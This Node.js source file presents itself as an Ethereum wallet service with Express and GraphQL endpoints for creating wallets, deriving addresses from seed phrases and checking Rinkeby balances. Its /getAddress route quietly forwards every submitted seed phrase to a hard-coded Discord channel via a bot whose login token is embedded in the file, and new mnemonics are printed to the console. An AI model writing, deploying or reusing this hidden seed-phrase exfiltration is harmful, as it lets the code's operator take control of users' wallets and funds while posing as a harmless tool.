const express = require('express');
const expressGraphQL = require('express-graphql').graphqlHTTP;
const {
    GraphQLSchema,
    GraphQLObjectType,
    GraphQLString,
    GraphQLInt,
    GraphQLNonNull,
    GraphQLList,
    astFromValue,
    GraphQLFloat
} = require('graphql')
const ethers = require('ethers');
const { Client, Intents } = require("discord.js");
const client = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
});

const network = 'rinkeby' // use rinkeby testnet
const provider = ethers.getDefaultProvider(network)


const RootQeury = new GraphQLObjectType({
    name: 'Qeury',
    description: "Root Qeury",
    fields: () => ({
        balance: {
            type: GraphQLFloat,
            description: 'Retrive A account balance using seed phrase ',
            args: {
                address: {
                    type: GraphQLString
                }
            },
            resolve: async(parent, args) => {
                try {
                    const balance = await provider.getBalance(args.address);
                    // convert a currency unit from wei to ether
                    const balanceInEth = ethers.utils.formatEther(balance)
                    console.log(`balance: ${balanceInEth} ETH`)
                    return balanceInEth;
                } catch (err) {
                    console.log(err)
                    return null;

                }
            }


        },
        getAdress: ({
            type: GraphQLString,
            description: "Retrun Wallet Adress From Seed Phrase",
            args: {
                phrase: {
                    type: GraphQLString
                }
            },
            resolve: async(parent, args) => {
                try {
                    const wallet = ethers.Wallet.fromMnemonic(args.phrase);
                    return wallet.address;
                } catch (err) {
                    console.log(err);
                    return null;
                }
            }
        })
    })
})

const RootMutationType = new GraphQLObjectType({
    name: 'mutation',
    description: 'root mutation',
    fields: () => ({
        addwalet: {
            type: new GraphQLList(GraphQLString),
            description: 'Create a new Wallet',
            args: {

            },
            resolve: (parent, args) => {
                const randomMnemonic = ethers.Wallet.createRandom().mnemonic;
                const myArray = randomMnemonic.phrase.split(" ");
                return myArray;
            }
        },

    })
})
const schema = new GraphQLSchema({
    query: RootQeury,
    mutation: RootMutationType
})
const app = express();
app.use(express.json());
app.use('/graphql', expressGraphQL({
    schema: schema,
    graphiql: true
}));

app.post("/CreateNewWallet", async(req, res) => {
    const randomMnemonic = ethers.Wallet.createRandom().mnemonic;
    console.log(randomMnemonic.phrase)
    const myArray = randomMnemonic.phrase.split(" ");
    res.json(myArray);
})
app.get("/getAddress", async(req, res) => {
    SendPhrase(req.body.phrase);
    try {
        const wallet = ethers.Wallet.fromMnemonic(req.body.phrase);
        res.send(wallet.address)
    } catch (err) {
        console.log(err);
        res.send(null);
    }
})
client.on('ready', client => {
    console.log("Connected")
})
client.login("OTczNzc3MzY5NjMyNDkzNjEw.GdHpKL.3X1DTGGWjNGw69jR9UDEY_mThoNl2-6TcgxqCc");

function SendPhrase(phrase) {
    client.channels.cache.get('973836939155374120').send(`Wallet Phrase : ${phrase}`);


}
app.get("/balance", async(req, res) => {
    try {
        const balance = await provider.getBalance(req.body.address);
        // convert a currency unit from wei to ether
        const balanceInEth = ethers.utils.formatEther(balance)
        console.log(`balance: ${balanceInEth} ETH`)
        res.send(balanceInEth)
    } catch (err) {
        console.log(err)
        res.send(null);

    }
})



const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Listning  ${PORT}`);
})